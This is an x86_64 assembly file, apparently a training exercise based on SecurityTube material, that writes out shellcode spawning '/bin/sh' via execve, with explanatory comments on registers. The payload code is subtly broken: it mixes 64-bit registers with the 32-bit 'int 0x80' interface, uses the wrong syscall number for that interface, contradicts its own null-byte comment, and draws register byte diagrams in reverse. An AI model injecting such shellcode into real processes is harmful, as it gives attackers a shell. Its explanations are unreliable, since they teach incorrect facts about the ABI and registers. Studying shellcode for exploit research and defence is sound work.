; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;

global _start  		

section .text
_start:

    ; PUSH 0x00000000 on the Stack
    ; this is where kernel will read to invoke the syscall execve later
	xor rax, rax ; A ^ A is always 0
	push rax

	;  ************** 1o ARGUMENT IS HERE ***************
    ; PUSH //bin/sh in reverse i.e. hs/nib//
    push 0x68732f6e
    push 0x69622f2f
    ; push 0x68732f2e ; hs/. or ./sh


	; Make EBX point to //bin/sh on the Stack using ESP
	; mov rbx, rsp; not working
	mov rdi, rsp ; this is for x84_64
	; mov rdi, msg
	; ***************************************************

	; ************** 3o ARGUMENT IS HERE *********************
	; PUSH 0x00000000 using EAX and point EDX to it using ESP
	push rax
	mov rdx, rsp ; it's correct
	; ********************************************************

	; ************** 2o ARGUMENT IS HERE **************************************
	; PUSH Address of //bin/sh on the Stack and make ECX point to it using ESP
	; push rbx; not working
	push rdi ; we've changed this from rbx to rdi
	; mov rcx, rsp
	mov rsi, rsp; that's the correct one for my architecture x86_64
	; *************************************************************************

	; ************* INVOKE SYS CALL 59 - EXECVE *********************
	; EAX = 0, Let's move 59 into AL to avoid nulls in the Shellcode
	; AL = lower 1/4 of word of EAX
	mov rax, 59
	int 0x80
	; ***************************************************************

;The %al referes to the low byte of the %ax register, %ah in the same way referes to the high byte of the %ax register. In 32-bit assembly you can access the different parts of a register with different operands. 
;
;A register is 32-bits (4 bytes). Let's visualize it as such:
;[00000000 00000000 00000000 00000000]
;
;When you operate on the whole 32-bits of the register, you use the %eax (extended ax) operand.
;
;%ax referes to the lowest two bytes (16 bits) of the %eax register
;[00000000 00000000 -------- --------]
;
;%al again, referes two the lowest byte in %ax
;[00000000 -------- -------- --------]
;
;and %ah the highest byte in %ax (note: not the highest byte in %eax)
;[-------- 00000000 -------- --------]
;
;To sum up: 
;
;%eax = [x x x x]
;%ax = [x x - -]
;%al = [x - - -]
;%ah = [- x - -]